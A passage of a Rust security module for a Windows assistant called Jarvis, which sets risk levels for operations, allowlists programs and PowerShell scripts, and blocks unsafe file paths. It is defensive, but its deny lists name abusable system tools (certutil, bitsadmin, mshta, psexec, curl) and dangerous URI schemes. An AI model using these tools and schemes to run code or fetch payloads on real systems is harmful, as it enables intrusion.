// What a command is allowed to DO, checked in Rust at the moment it does it.
//
// Three ideas:
//  1. Risk. Every command declares `risk = "low" | "medium" | "high"` in its command.toml (no declaration = low,
//     the least a command can do). Every operation that touches the computer (start a program, open something,
//     write a file, press keys) has a risk of its own, worked out here from WHAT it is and its parameters.
//     An operation riskier than the command that asks for it is refused: a "low" command cannot kill a process.
//  2. Explicit operations. Nothing starts "because the command is allowed to": a program must be one of a short list
//     and its parameters must have a known shape (`taskkill /im NAME`, `shutdown /s /t N`, `powershell -File <a file
//     of the command's own folder>`, or one of the known inline scripts). A free `cmd /C <text>` does not exist.
//  3. Protected places. Files are written and deleted only in the user's own folders and the data folder of Jarvis;
//     Windows, the programs, the installed Jarvis and its commands are never written, however the path is spelled
//     (relative, `..`, a link, a junction, a short name, a stream, a device name).
//
// This is NOT a proof of who is asking. The door a phrase came through (origin.rs) and the confirmation of
// dangerous operations (confirm.rs) are separate; nothing here says the owner is at the computer.

use std::cell::RefCell;
use std::path::{Component, Path, PathBuf};

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Risk {
    Low,
    Medium,
    High,
}

impl Risk {
    pub fn parse(text: &str) -> Option<Risk> {
        match text.trim().to_lowercase().as_str() {
            "low" => Some(Risk::Low),
            "medium" => Some(Risk::Medium),
            "high" => Some(Risk::High),
            _ => None,
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Risk::Low => "low",
            Risk::Medium => "medium",
            Risk::High => "high",
        }
    }
}

// ---------------------------------------------------------------------------------------------------------------------
// the command that runs on this thread

#[derive(Clone, Debug)]
pub struct Running {
    pub id: String,
    // the declared risk; a command with no (or a wrong) declaration is "low"
    pub risk: Risk,
    pub declared: bool,
    // the folder of the command (its own scripts live there)
    pub folder: PathBuf,
}

thread_local! {
    static RUNNING: RefCell<Option<Running>> = RefCell::new(None);
}

pub struct RunningGuard(Option<Running>);

impl Drop for RunningGuard {
    fn drop(&mut self) {
        RUNNING.with(|r| *r.borrow_mut() = self.0.take());
    }
}

pub fn enter_command(id: &str, declared: &str, folder: &Path) -> RunningGuard {
    let parsed = Risk::parse(declared);
    if parsed.is_none() {
        warn!("Command {} has no valid risk (\"{}\"): treated as low", id, declared);
    }
    let now = Running { id: id.to_string(), risk: parsed.unwrap_or(Risk::Low), declared: parsed.is_some(), folder: folder.to_path_buf() };
    RunningGuard(RUNNING.with(|r| r.borrow_mut().replace(now)))
}

pub fn running() -> Option<Running> {
    RUNNING.with(|r| r.borrow().clone())
}

// ---------------------------------------------------------------------------------------------------------------------
// operations

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Op {
    // `cmd /C <text>`: refused always
    Shell(String),
    // a program with its arguments (no shell)
    Run { program: String, args: Vec<String> },
    // what a double click does (a link, a file, a folder, a program by name)
    Open(String),
    // write / append / create a folder / delete (the path as the script gave it, already made absolute)
    FsWrite(PathBuf),
    FsRemove(PathBuf),
    FsRead(PathBuf),
    // a key combination
    Keys(String),
    // the mouse, a window action, typed text, the clipboard: input that acts like the user's hands
    Input(String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Verdict {
    pub risk: Risk,
    // the operation in one canonical line: the same operation always gives the same line, a changed parameter another
    pub canonical: String,
}

fn deny<T>(why: &str) -> Result<T, String> {
    Err(why.to_string())
}

// the risk of an operation and whether it is allowed at all (no context: only what the operation is)
pub fn judge(op: &Op) -> Result<Verdict, String> {
    match op {
        Op::Shell(_) => deny("произвольная команда оболочки (cmd /C) запрещена: используйте явную операцию"),
        Op::Run { program, args } => judge_run(program, args),
        Op::Open(target) => judge_open(target),
        Op::FsWrite(p) => judge_fs(p, FsMode::Write).map(|c| Verdict { risk: Risk::Medium, canonical: format!("write {}", c.display()) }),
        Op::FsRemove(p) => judge_fs(p, FsMode::Remove).map(|c| Verdict { risk: Risk::High, canonical: format!("remove {}", c.display()) }),
        Op::FsRead(p) => judge_fs(p, FsMode::Read).map(|c| Verdict { risk: Risk::Low, canonical: format!("read {}", c.display()) }),
        Op::Keys(combo) => judge_keys(combo),
        Op::Input(what) => Ok(Verdict { risk: Risk::Medium, canonical: format!("input {}", what) }),
    }
}

// judge + the risk of the running command. Outside of a command (a scenario of the user, the window) only `judge` applies.
pub fn authorize(op: &Op) -> Result<Verdict, String> {
    let v = match judge(op) {
        Ok(v) => v,
        Err(why) => {
            warn!("Operation refused: {}", why);
            return Err(why);
        }
    };
    if let Some(cmd) = running() {
        // a dangerous operation of a command only inside a run that the user confirmed (confirm.rs)
        if v.risk == Risk::High && !crate::confirm::is_confirmed(&cmd.id) {
            let why = format!("операция «{}» опасна и не подтверждена пользователем (команда {})", v.canonical, cmd.id);
            warn!("Operation refused: {}", why);
            return Err(why);
        }
        if v.risk > cmd.risk {
            let why = format!("команда {} имеет риск «{}», а операция «{}» — «{}»", cmd.id, cmd.risk.as_str(), v.canonical, v.risk.as_str());
            warn!("Operation refused: {}", why);
            return Err(why);
        }
    }
    Ok(v)
}

// ---------------------------------------------------------------------------------------------------------------------
// programs

fn norm_program(program: &str) -> Option<String> {
    let p = program.trim().to_lowercase();
    // a bare file name only: a path (a copy of cmd.exe somewhere else) is not the system tool
    if p.is_empty() || p.contains('/') || p.contains('\\') || p.contains(':') {
        return None;
    }
    Some(p.strip_suffix(".exe").map(|s| s.to_string()).unwrap_or(p))
}

// "/select,x", "/root,x", "-p": a switch of the program, not a path (on Windows nothing legitimate starts with a slash)
fn is_switch(arg: &str) -> bool {
    arg.starts_with('-') || (cfg!(windows) && arg.starts_with('/'))
}

fn lower(args: &[String]) -> Vec<String> {
    args.iter().map(|a| a.to_lowercase()).collect()
}

fn judge_run(program: &str, args: &[String]) -> Result<Verdict, String> {
    // automated tests: the PowerShell scripts are answered by a fake office program (see lua/api/core.rs)
    #[cfg(test)]
    if let Ok(runner) = std::env::var("JARVIS_TEST_RUNNER") {
        if !runner.is_empty() && program == runner {
            return Ok(Verdict { risk: Risk::Medium, canonical: format!("test-runner {}", args.join(" ")) });
        }
    }
    let Some(name) = norm_program(program) else {
        return deny(&format!("запуск «{}» не разрешён: нужно имя системной программы без пути", program));
    };
    let low = lower(args);
    match name.as_str() {
        "taskkill" => judge_taskkill(args, &low),
        "shutdown" => judge_shutdown(args, &low),
        "rundll32" => match low.as_slice() {
            [a] if a == "user32.dll,lockworkstation" => Ok(Verdict { risk: Risk::Medium, canonical: "rundll32 user32.dll,LockWorkStation".into() }),
            [a, b] if a == "powrprof.dll,setsuspendstate" && b == "0,1,0" => Ok(Verdict { risk: Risk::High, canonical: "rundll32 powrprof.dll,SetSuspendState 0,1,0".into() }),
            _ => deny("rundll32 разрешён только для блокировки и спящего режима"),
        },
        "powershell" => judge_powershell(args),
        "calc" => match args {
            [] => Ok(Verdict { risk: Risk::Medium, canonical: "calc".into() }),
            _ => deny("calc запускается без параметров"),
        },
        "explorer" => match args {
            [target] if !is_switch(target) => {
                // a folder or a drive: the same rules as opening it
                let v = judge_open(target)?;
                Ok(Verdict { risk: v.risk.max(Risk::Medium), canonical: format!("explorer {}", target) })
            }
            _ => deny("explorer разрешён только с одним путём (папка или диск)"),
        },
        "notepad" => match args {
            [] => Ok(Verdict { risk: Risk::Medium, canonical: "notepad".into() }),
            [path] if !is_switch(path) => {
                let c = judge_fs(Path::new(path), FsMode::Read)?;
                Ok(Verdict { risk: Risk::Medium, canonical: format!("notepad {}", c.display()) })
            }
            _ => deny("notepad разрешён только с одним файлом"),
        },
        _ => deny(&format!("программа «{}» не входит в список разрешённых для команд", name)),
    }
}

// names that are never ended by a command: the system, the shell, Jarvis itself
const PROTECTED_PROCESSES: &[&str] = &[
    "system", "registry", "smss", "csrss", "wininit", "winlogon", "services", "lsass", "lsaiso", "svchost", "dwm", "fontdrvhost", "explorer", "sihost", "ctfmon", "taskhostw",
    "runtimebroker", "searchhost", "startmenuexperiencehost", "shellexperiencehost", "securityhealthservice", "msmpeng", "jarvis-app", "jarvis-gui", "jarvis",
];

pub fn valid_process_name(name: &str) -> Result<(), String> {
    let ok_chars = !name.is_empty() && name.chars().count() <= 64 && name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | ' ' | '(' | ')'));
    if !ok_chars || name.contains("..") || name.starts_with('-') || name.starts_with('/') || name.contains('*') {
        return deny(&format!("недопустимое имя процесса «{}»", name));
    }
    let stem = name.to_lowercase();
    let stem = stem.strip_suffix(".exe").unwrap_or(&stem);
    if PROTECTED_PROCESSES.contains(&stem) {
        return deny(&format!("процесс «{}» защищён: команда не может его завершить", name));
    }
    Ok(())
}

fn judge_taskkill(args: &[String], low: &[String]) -> Result<Verdict, String> {
    // taskkill [/f] /im NAME
    let (force, name) = match low {
        [a, b] if a == "/im" => {
            let _ = b;
            (false, &args[1])
        }
        [f, a, b] if f == "/f" && a == "/im" => {
            let _ = b;
            (true, &args[2])
        }
        _ => return deny("taskkill разрешён только в виде «taskkill [/f] /im ИМЯ»"),
    };
    valid_process_name(name)?;
    let risk = if force { Risk::High } else { Risk::Medium };
    Ok(Verdict { risk, canonical: format!("taskkill{} /im {}", if force { " /f" } else { "" }, name.to_lowercase()) })
}

fn judge_shutdown(args: &[String], low: &[String]) -> Result<Verdict, String> {
    match low {
        [a] if a == "/a" => Ok(Verdict { risk: Risk::Medium, canonical: "shutdown /a".into() }),
        [a] if a == "/h" || a == "/l" => Ok(Verdict { risk: Risk::High, canonical: format!("shutdown {}", a) }),
        [f, t, secs, c, _] if (f == "/s" || f == "/r") && t == "/t" && c == "/c" && args[4] == "Jarvis" => {
            let n: u64 = match secs.parse() {
                Ok(n) if secs.chars().all(|c| c.is_ascii_digit()) && n <= 315_360_000 => n,
                _ => return deny("shutdown: время должно быть числом секунд"),
            };
            Ok(Verdict { risk: Risk::High, canonical: format!("shutdown {} /t {} /c Jarvis", f, n) })
        }
        _ => deny("shutdown разрешён только в видах /a, /h, /l и «/s|/r /t N /c Jarvis»"),
    }
}

// inline scripts the packs run with `-Command` (the prelude puts the UTF-8 line in front of them). Exact texts: a new
// inline script needs a line here on purpose.
const PS_UTF8: &str = "[Console]::OutputEncoding = [Text.Encoding]::UTF8; ";

const INLINE_SCRIPTS: &[(&str, Risk)] = &[
    ("'ok'", Risk::Low),
    ("Clear-RecycleBin -Force -ErrorAction SilentlyContinue", Risk::High),
    ("$b = Get-CimInstance Win32_Battery | Select-Object -First 1; if ($b) { \"$($b.EstimatedChargeRemaining)|$($b.BatteryStatus)\" }", Risk::Medium),
    ("$o = Get-CimInstance Win32_OperatingSystem; '{0}|{1}' -f [math]::Round(($o.TotalVisibleMemorySize - $o.FreePhysicalMemory)/1MB, 1), [math]::Round($o.TotalVisibleMemorySize/1MB, 1)", Risk::Medium),
    ("[int](Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average", Risk::Medium),
    ("$d = Get-PSDrive C; '{0}|{1}' -f [int]($d.Free/1GB), [int](($d.Used + $d.Free)/1GB)", Risk::Medium),
    ("(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.IPAddress -notlike '169.*' } | Select-Object -First 1).IPAddress", Risk::Medium),
    ("[int]((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes", Risk::Medium),
    ("(New-Object -ComObject Shell.Application).MinimizeAll()", Risk::Medium),
    ("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%+')", Risk::Medium),
];

// "…FromBase64String('<base64>')": the text inside must be plain base64 of UTF-8, nothing else
fn base64_literal(s: &str) -> Option<String> {
    if s.is_empty() || s.len() > 4096 || s.len() % 4 != 0 {
        return None;
    }
    let value = |c: u8| -> Option<u32> {
        match c {
            b'A'..=b'Z' => Some((c - b'A') as u32),
            b'a'..=b'z' => Some((c - b'a') as u32 + 26),
            b'0'..=b'9' => Some((c - b'0') as u32 + 52),
            b'+' => Some(62),
            b'/' => Some(63),
            _ => None,
        }
    };
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len() / 4 * 3);
    for (i, chunk) in bytes.chunks(4).enumerate() {
        let last = (i + 1) * 4 == bytes.len();
        let pad = chunk.iter().rev().take_while(|c| **c == b'=').count();
        if pad > 2 || (pad > 0 && !last) {
            return None;
        }
        let mut n: u32 = 0;
        for c in &chunk[..4 - pad] {
            n = (n << 6) | value(*c)?;
        }
        n <<= 6 * pad as u32;
        out.push((n >> 16) as u8);
        if pad < 2 {
            out.push((n >> 8) as u8);
        }
        if pad < 1 {
            out.push(n as u8);
        }
    }
    String::from_utf8(out).ok()
}

const PS_CLIPBOARD_HEAD: &str = "Set-Clipboard -LiteralPath ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('";
const PS_CLIPBOARD_TAIL: &str = "')))";
const PS_DELETE_HEAD: &str = "Add-Type -AssemblyName Microsoft.VisualBasic; $p = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('";
const PS_DELETE_TAIL: &str = "')); if (Test-Path -LiteralPath $p -PathType Container) { [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteDirectory($p, 'OnlyErrorDialogs', 'SendToRecycleBin') } else { [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteFile($p, 'OnlyErrorDialogs', 'SendToRecycleBin') }";

fn judge_inline_powershell(script: &str) -> Result<Verdict, String> {
    let body = script.strip_prefix(PS_UTF8).unwrap_or(script).trim();
    if let Some((_, risk)) = INLINE_SCRIPTS.iter().find(|(s, _)| *s == body) {
        return Ok(Verdict { risk: *risk, canonical: format!("powershell -Command {}", body) });
    }
    if let Some(b64) = body.strip_prefix(PS_CLIPBOARD_HEAD).and_then(|r| r.strip_suffix(PS_CLIPBOARD_TAIL)) {
        let path = base64_literal(b64).ok_or("Set-Clipboard: путь не в base64")?;
        judge_fs(Path::new(&path), FsMode::Read)?;
        return Ok(Verdict { risk: Risk::Medium, canonical: format!("powershell Set-Clipboard {}", path) });
    }
    if let Some(b64) = body.strip_prefix(PS_DELETE_HEAD).and_then(|r| r.strip_suffix(PS_DELETE_TAIL)) {
        let path = base64_literal(b64).ok_or("удаление: путь не в base64")?;
        // into the recycle bin, but still only where the user's own files are
        let c = judge_fs(Path::new(&path), FsMode::Remove)?;
        return Ok(Verdict { risk: Risk::High, canonical: format!("powershell recycle {}", c.display()) });
    }
    deny("этот PowerShell-скрипт не входит в список разрешённых (INLINE_SCRIPTS)")
}

fn judge_powershell(args: &[String]) -> Result<Verdict, String> {
    // the same three leading switches everywhere (no profile, the policy does not matter: the script is ours)
    let rest = match args {
        [a, b, c, rest @ ..] if a == "-NoProfile" && b == "-ExecutionPolicy" && c == "Bypass" => rest,
        // the other start-ups of Jarvis use -NonInteractive as well; commands do not
        _ => return deny("powershell запускается только как «-NoProfile -ExecutionPolicy Bypass …»"),
    };
    match rest {
        [f, script, extra @ ..] if f == "-File" => {
            let folder = match running() {
                Some(r) => r.folder,
                None => return deny("скрипт PowerShell можно запускать только из команды"),
            };
            let script_path = canonical_existing(Path::new(script))?;
            let folder = canonical_existing(&folder)?;
            let is_ps1 = script_path.extension().map(|e| e.eq_ignore_ascii_case("ps1")).unwrap_or(false);
            if !is_ps1 || !path_starts_with(&script_path, &folder) {
                return deny("-File: только файл .ps1 из папки самой команды");
            }
            if !crate::integrity::file_is_listed(&script_path) {
                return deny("-File: файл не из этой сборки Jarvis (изменён или новый)");
            }
            if extra.iter().any(|a| a.contains('\0') || a.chars().count() > 4096) {
                return deny("-File: недопустимый параметр");
            }
            Ok(Verdict { risk: Risk::Medium, canonical: format!("powershell -File {} ({} params)", script_path.display(), extra.len()) })
        }
        [c, script] if c == "-Command" => judge_inline_powershell(script),
        _ => deny("powershell: разрешены только «-File файл.ps1 …» и известные «-Command …»"),
    }
}

// ---------------------------------------------------------------------------------------------------------------------
// opening

// Windows tools and programs that are started by their short name ("calc", "taskmgr.exe", "winword")
const SHELL_TOOLS_HIGH: &[&str] = &[
    "cmd", "powershell", "pwsh", "wscript", "cscript", "mshta", "regsvr32", "rundll32", "msiexec", "reg", "regedit", "schtasks", "sc", "net", "net1", "wmic", "certutil", "bitsadmin",
    "curl", "wget", "forfiles", "installutil", "msbuild", "bash", "wsl", "python", "pythonw", "node", "ssh", "telnet", "ftp", "tftp", "at", "cmstp", "odbcconf", "ieexec",
    "regasm", "regsvcs", "diskpart", "format", "takeown", "icacls", "cacls", "vssadmin", "bcdedit", "netsh", "runas", "psexec", "mmc", "eventvwr",
];

const EXEC_EXT: &[&str] = &["exe", "com", "bat", "cmd", "ps1", "psm1", "vbs", "vbe", "js", "jse", "wsf", "wsh", "msi", "msp", "scr", "hta", "jar", "reg", "cpl", "dll", "pif", "application", "gadget", "msc", "lnk", "url", "appref-ms", "settingcontent-ms", "inf", "sct", "xll", "iqy", "slk"];

// link schemes that run something or reach a network share
const BAD_SCHEMES: &[&str] = &["file", "javascript", "vbscript", "data", "ms-msdt", "search-ms", "search", "ms-officecmd", "ms-appinstaller", "cmd", "powershell", "ms-cxh", "ms-cxh-full", "ms-excel", "ms-word", "ms-powerpoint", "ldap", "res", "mhtml", "jar", "ms-vsp", "ms-search", "ms-retail"];

fn scheme_of(target: &str) -> Option<String> {
    let (s, rest) = target.split_once(':')?;
    // "C:\x" is a drive, not a scheme
    if s.len() < 2 || !s.chars().next()?.is_ascii_alphabetic() || !s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-')) {
        return None;
    }
    // "calc:" (no slashes) or "steam://x"
    let _ = rest;
    Some(s.to_lowercase())
}

fn judge_open(target: &str) -> Result<Verdict, String> {
    let t = target.trim();
    if t.is_empty() || t.contains('\0') || t.chars().any(|c| c == '\n' || c == '\r') || t.chars().count() > 2048 {
        return deny("недопустимая цель открытия");
    }
    if let Some(scheme) = scheme_of(t) {
        if BAD_SCHEMES.contains(&scheme.as_str()) {
            return deny(&format!("ссылки «{}:» не открываются", scheme));
        }
        return Ok(Verdict { risk: Risk::Medium, canonical: format!("open {}", t) });
    }
    // a network share (and a device path) is never opened: it can run remote code or leak the Windows password
    if t.starts_with("\\\\") || t.starts_with("//") {
        return deny("сетевые пути и пути устройств не открываются");
    }
    let is_path = t.contains('/') || t.contains('\\') || t.chars().nth(1) == Some(':');
    let ext = Path::new(t).extension().map(|e| e.to_string_lossy().to_lowercase());
    if !is_path {
        // a short name: "calc", "taskmgr.exe", "winword"
        let stem = t.to_lowercase();
        let stem = stem.strip_suffix(".exe").unwrap_or(&stem).to_string();
        if SHELL_TOOLS_HIGH.contains(&stem.as_str()) {
            return Ok(Verdict { risk: Risk::High, canonical: format!("open {}", t) });
        }
        // a script or an installer by name is an execution as well
        if ext.as_deref().map(|e| e != "exe" && EXEC_EXT.contains(&e)).unwrap_or(false) {
            return Ok(Verdict { risk: Risk::High, canonical: format!("open {}", t) });
        }
        return Ok(Verdict { risk: Risk::Medium, canonical: format!("open {}", t) });
    }
    let executable = ext.as_deref().map(|e| EXEC_EXT.contains(&e)).unwrap_or(false);
    if !executable {
        // a document, a picture, a folder
        return Ok(Verdict { risk: Risk::Medium, canonical: format!("open {}", t) });
    }
    // a program or a script by its path: only the places where installed programs and the Start menu links live are
    // an ordinary start; anywhere else (Downloads, a found file) it is running code from an unknown place
    let c = canonical_existing(Path::new(t)).unwrap_or_else(|_| PathBuf::from(t));
    let script = ext.as_deref().map(|e| !matches!(e, "exe" | "lnk" | "url" | "appref-ms")).unwrap_or(false);
    if !script && (is_known_program(t, &c) || program_roots().iter().any(|r| path_starts_with(&c, r))) {
        return Ok(Verdict { risk: Risk::Medium, canonical: format!("open {}", t) });
    }
    Ok(Verdict { risk: Risk::High, canonical: format!("open {}", t) })
}

// Programs that the system itself named: the fixed list of programs of Jarvis (where they are installed) and the index of
// installed programs. Their start is an ordinary start wherever they are installed (a portable Total Commander in
// D:\\Soft). The list is filled by the code that finds programs, never from the text of a phrase.
static KNOWN_PROGRAMS: once_cell::sync::Lazy<parking_lot::Mutex<std::collections::HashSet<String>>> = once_cell::sync::Lazy::new(|| parking_lot::Mutex::new(std::collections::HashSet::new()));

fn known_key(path: &str) -> String {
    path.trim().trim_matches('"').replace('/', "\\").to_lowercase()
}

pub fn note_known_program(path: &str) {
    if path.trim().is_empty() {
        return;
    }
    let mut set = KNOWN_PROGRAMS.lock();
    if set.len() >= 2048 {
        set.clear();
    }
    set.insert(known_key(path));
}

fn is_known_program(target: &str, canonical: &Path) -> bool {
    let set = KNOWN_PROGRAMS.lock();
    set.contains(&known_key(target)) || set.contains(&known_key(&canonical.to_string_lossy().trim_start_matches("\\\\?\\")))
}

// where installed programs and Start menu links live
fn program_roots() -> Vec<PathBuf> {
    let mut v: Vec<PathBuf> = Vec::new();
    for var in ["ProgramFiles", "ProgramFiles(x86)", "ProgramW6432", "SystemRoot", "ProgramData"] {
        if let Ok(p) = std::env::var(var) {
            if !p.is_empty() {
                v.push(PathBuf::from(p));
            }
        }
    }
    for var in ["LOCALAPPDATA", "APPDATA"] {
        if let Ok(p) = std::env::var(var) {
            if !p.is_empty() {
                let base = PathBuf::from(p);
                if var == "LOCALAPPDATA" {
                    v.push(base.join("Programs"));
                    v.push(base.join("Microsoft").join("WindowsApps"));
                } else {
                    v.push(base.join("Microsoft").join("Windows").join("Start Menu"));
                }
            }
        }
    }
    if let Ok(up) = std::env::var("USERPROFILE") {
        v.push(PathBuf::from(&up).join("Desktop"));
    }
    v.into_iter().filter_map(|p| canonical_existing(&p).ok()).collect()
}

// ---------------------------------------------------------------------------------------------------------------------
// keys

fn judge_keys(combo: &str) -> Result<Verdict, String> {
    let mut parts: Vec<String> = combo.to_lowercase().split('+').map(|p| p.trim().to_string()).map(|p| if matches!(p.as_str(), "windows" | "super" | "meta" | "lwin" | "rwin") { "win".to_string() } else { p }).collect();
    parts.sort();
    let is = |want: &[&str]| parts.len() == want.len() && want.iter().all(|w| parts.iter().any(|p| p == w));
    // the Run box and the power menu of the Win key, the secure attention sequence, the task manager: a command could
    // type anything after them (other combinations with Win and Alt, like Win+Alt+R, are ordinary)
    if is(&["win", "r"]) || is(&["win", "x"]) || is(&["ctrl", "alt", "delete"]) || is(&["ctrl", "alt", "del"]) || is(&["ctrl", "shift", "escape"]) || is(&["ctrl", "shift", "esc"]) {
        return deny(&format!("сочетание «{}» запрещено для команд", combo));
    }
    Ok(Verdict { risk: Risk::Medium, canonical: format!("keys {}", combo.to_lowercase()) })
}

// ---------------------------------------------------------------------------------------------------------------------
// files

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum FsMode {
    Read,
    Write,
    Remove,
}

// "a/b" and "a\b" are both used by the scripts
fn path_starts_with(path: &Path, root: &Path) -> bool {
    let norm = |p: &Path| -> Vec<String> {
        p.components()
            .filter_map(|c| match c {
                Component::Normal(s) => Some(s.to_string_lossy().to_string()),
                Component::Prefix(p) => {
                    let s = p.as_os_str().to_string_lossy().to_string();
                    // \\?\C: and C: are the same drive
                    Some(s.trim_start_matches("\\\\?\\").to_string())
                }
                _ => None,
            })
            .map(|s| if cfg!(windows) { s.to_lowercase() } else { s })
            .collect()
    };
    let (p, r) = (norm(path), norm(root));
    !r.is_empty() && p.len() >= r.len() && p[..r.len()] == r[..]
}

// the path with every link, junction and short name resolved. A path that does not exist yet is resolved through its
// nearest existing parent; a link that points at nothing (yet) is followed to the place where writing would CREATE the
// file, because that is where the bytes would go.
fn canonical_existing(path: &Path) -> Result<PathBuf, String> {
    resolve(path, 0)
}

fn resolve(path: &Path, depth: u32) -> Result<PathBuf, String> {
    if depth > 40 {
        return Err(format!("слишком много ссылок в пути «{}»", path.display()));
    }
    if let Ok(c) = std::fs::canonicalize(path) {
        return Ok(c);
    }
    let mut missing: Vec<std::ffi::OsString> = Vec::new();
    let mut cur = path.to_path_buf();
    loop {
        if let Ok(c) = std::fs::canonicalize(&cur) {
            let mut out = c;
            for part in missing.iter().rev() {
                out.push(part);
            }
            return Ok(out);
        }
        if let Ok(meta) = std::fs::symlink_metadata(&cur) {
            if meta.file_type().is_symlink() {
                let target = std::fs::read_link(&cur).map_err(|e| format!("ссылка «{}» не читается: {}", cur.display(), e))?;
                let mut full = if target.is_relative() { cur.parent().map(|p| p.join(&target)).unwrap_or(target) } else { target };
                for part in missing.iter().rev() {
                    full.push(part);
                }
                return resolve(&full, depth + 1);
            }
        }
        match (cur.file_name().map(|n| n.to_os_string()), cur.parent().map(|p| p.to_path_buf())) {
            (Some(name), Some(parent)) if !parent.as_os_str().is_empty() => {
                missing.push(name);
                cur = parent;
            }
            _ => return Err(format!("путь «{}» не удалось проверить", path.display())),
        }
    }
}

const DEVICE_NAMES: &[&str] = &["con", "prn", "aux", "nul", "com1", "com2", "com3", "com4", "com5", "com6", "com7", "com8", "com9", "lpt1", "lpt2", "lpt3", "lpt4", "lpt5", "lpt6", "lpt7", "lpt8", "lpt9", "conin$", "conout$", "clock$"];

// the way a path is spelled: things that make Windows treat it as something else than it looks like
fn spelling_ok(path: &Path) -> Result<(), String> {
    let text = path.to_string_lossy();
    if text.contains('\0') {
        return deny("недопустимый путь");
    }
    let s = text.replace('/', "\\");
    // `..` by its spelling (in a path with the \\?\ prefix Windows does not treat it as a parent, but a program that
    // later strips the prefix does)
    if s.split('\\').any(|part| part == "..") {
        return deny("«..» в пути запрещено");
    }
    if s.starts_with("\\\\") && !s.starts_with("\\\\?\\") {
        return deny("сетевые пути и пути устройств запрещены");
    }
    if s.starts_with("\\\\?\\") && !s[4..].chars().nth(1).map(|c| c == ':').unwrap_or(false) {
        return deny("пути устройств и UNC запрещены");
    }
    if cfg!(windows) {
        // after the drive letter a colon is an alternate data stream ("file.txt:hidden")
        let body = if s.starts_with("\\\\?\\") { &s[4..] } else { &s[..] };
        let body = if body.chars().nth(1) == Some(':') { &body[2..] } else { body };
        if body.contains(':') {
            return deny("потоки данных (:) в пути запрещены");
        }
    }
    for c in path.components() {
        if let Component::ParentDir = c {
            return deny("«..» в пути запрещено");
        }
        if let Component::Normal(n) = c {
            let n = n.to_string_lossy().to_lowercase();
            let stem = n.split('.').next().unwrap_or("");
            if DEVICE_NAMES.contains(&stem) {
                return deny("имена устройств (CON, NUL, COM1…) в пути запрещены");
            }
            if cfg!(windows) && (n.ends_with('.') || n.ends_with(' ')) {
                return deny("имя файла не может кончаться точкой или пробелом");
            }
        }
    }
    Ok(())
}

// places that are never written or deleted
fn protected_roots() -> Vec<PathBuf> {
    let mut v: Vec<PathBuf> = Vec::new();
    for var in ["SystemRoot", "windir", "ProgramFiles", "ProgramFiles(x86)", "ProgramW6432", "ProgramData", "SystemDrive"] {
        if let Ok(p) = std::env::var(var) {
            if !p.is_empty() {
                // "C:" alone would be the whole drive: only a real folder
                let mut pb = PathBuf::from(p);
                if var == "SystemDrive" {
                    continue;
                }
                if pb.as_os_str().is_empty() {
                    continue;
                }
                if pb.is_relative() && pb.components().count() == 0 {
                    pb = PathBuf::new();
                }
                v.push(pb);
            }
        }
    }
    #[cfg(not(windows))]
    for p in ["/etc", "/usr", "/bin", "/sbin", "/lib", "/lib64", "/boot", "/proc", "/sys", "/dev", "/var/lib", "/opt"] {
        v.push(PathBuf::from(p));
    }
    // the installed Jarvis (its program and its commands) and its resources
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            v.push(dir.to_path_buf());
        }
    }
    v.push(crate::APP_DIR.clone());
    // the folders that start programs when the user signs in
    if let Ok(a) = std::env::var("APPDATA") {
        v.push(PathBuf::from(a).join("Microsoft").join("Windows").join("Start Menu"));
    }
    v.extend(extra_protected());
    v.into_iter().filter(|p| !p.as_os_str().is_empty()).filter_map(|p| canonical_existing(&p).ok()).collect()
}

// the data folder of Jarvis: written by Jarvis only (secrets live there); a command has no business reading it
fn data_dir() -> Option<PathBuf> {
    #[cfg(test)]
    if let Some(d) = TEST_DATA.with(|t| t.borrow().clone()) {
        return canonical_existing(&d).ok();
    }
    crate::APP_CONFIG_DIR.get().and_then(|d| canonical_existing(d).ok())
}


// where a command may write and delete: the user's own folders, the data folder of Jarvis, the temporary folder
fn allowed_write_roots() -> Vec<PathBuf> {
    let mut v: Vec<PathBuf> = Vec::new();
    let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")).ok().filter(|h| !h.is_empty()).map(PathBuf::from);
    for name in ["documents", "desktop", "downloads", "pictures", "music", "videos"] {
        if let Some(p) = crate::filesearch::known_folder(name) {
            v.push(p);
        }
        if let Some(h) = &home {
            let mut chars = name.chars();
            let cap: String = chars.next().map(|c| c.to_uppercase().collect::<String>() + chars.as_str()).unwrap_or_default();
            v.push(h.join(cap));
        }
    }
    v.push(std::env::temp_dir());
    // the tests name the places themselves
    let extra = extra_allowed();
    if !extra.is_empty() {
        v = extra;
    }
    v.into_iter().filter_map(|p| canonical_existing(&p).ok()).collect()
}

fn judge_fs(path: &Path, mode: FsMode) -> Result<PathBuf, String> {
    spelling_ok(path)?;
    if !path.is_absolute() {
        return deny("путь должен быть полным");
    }
    let c = canonical_existing(path)?;
    // the real place may differ from the spelling (a link into Windows): both are checked as the real place
    if mode == FsMode::Read {
        if let Some(d) = data_dir() {
            if path_starts_with(&c, &d) {
                return deny("папка настроек Jarvis (в ней ключи и токены) для команд закрыта");
            }
        }
        return Ok(c);
    }
    for root in protected_roots() {
        if path_starts_with(&c, &root) {
            return deny(&format!("«{}» в защищённой папке «{}»", c.display(), root.display()));
        }
    }
    let data = data_dir();
    let in_data = data.as_ref().map(|d| path_starts_with(&c, d)).unwrap_or(false);
    if in_data {
        // Jarvis keeps its own settings there; a command writes only to its own spaces (the files it created)
        return deny("папка настроек Jarvis для команд закрыта");
    }
